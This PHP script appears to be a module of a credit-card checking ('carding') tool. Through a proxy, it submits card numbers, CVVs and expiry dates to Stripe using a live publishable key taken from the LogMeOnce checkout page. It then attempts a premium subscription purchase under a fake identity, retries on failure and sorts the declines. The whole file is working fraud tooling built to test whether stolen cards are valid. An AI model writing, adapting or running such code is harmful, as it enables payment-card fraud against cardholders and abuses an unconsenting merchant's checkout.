<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F66ea6b3ee%3B+stripe-js-v3%2F66ea6b3ee&time_on_page='.rand(50000, 100000).'&key=pk_live_p92801FvDJUUBQoNJRyhVHAG';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://secure.logmeonce.com/subscription/checkout/license-premium', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$csrf_token = $this->getstr($r2->body, "csrf_token' value='", "'");

if (empty($csrf_token)) {
	$empty = "Second Request Token is Empty";

	goto start;
}

$data = 'csrf_token='.$csrf_token.'&email='.urlencode($fake->email).'&license=license-personal&bundle%5B%5D=storage-10gb&cloud_encrypter=cloud-encrypter-free&cycle=12&spk=pk_live_p92801FvDJUUBQoNJRyhVHAG&method=stripe&coupon=&token='.$tok;

$headers = [
	'authority: secure.logmeonce.com',
	'accept: application/json, text/javascript, */*; q=0.01',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/x-www-form-urlencoded; charset=UTF-8',
	'origin: https://secure.logmeonce.com',
	'referer: https://secure.logmeonce.com/subscription/checkout/license-premium',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
];

$r3 = $this->curlx->Post('https://secure.logmeonce.com/subscription/checkout/license-premium', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success || empty($r3->body)) goto start;

$json_r3 = json_decode($r3->body);

$msg = $json_r3->exception->message ?? $json_r3->message ?? null;

$type = $json_r3->exception->type ?? null;

$err = "".($msg ?? "Unknown Error")." -> ".($type ?? "N/A")."";

if (!$msg && !$type) file_put_contents('strg_r3_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body, $err, 'auth');

end: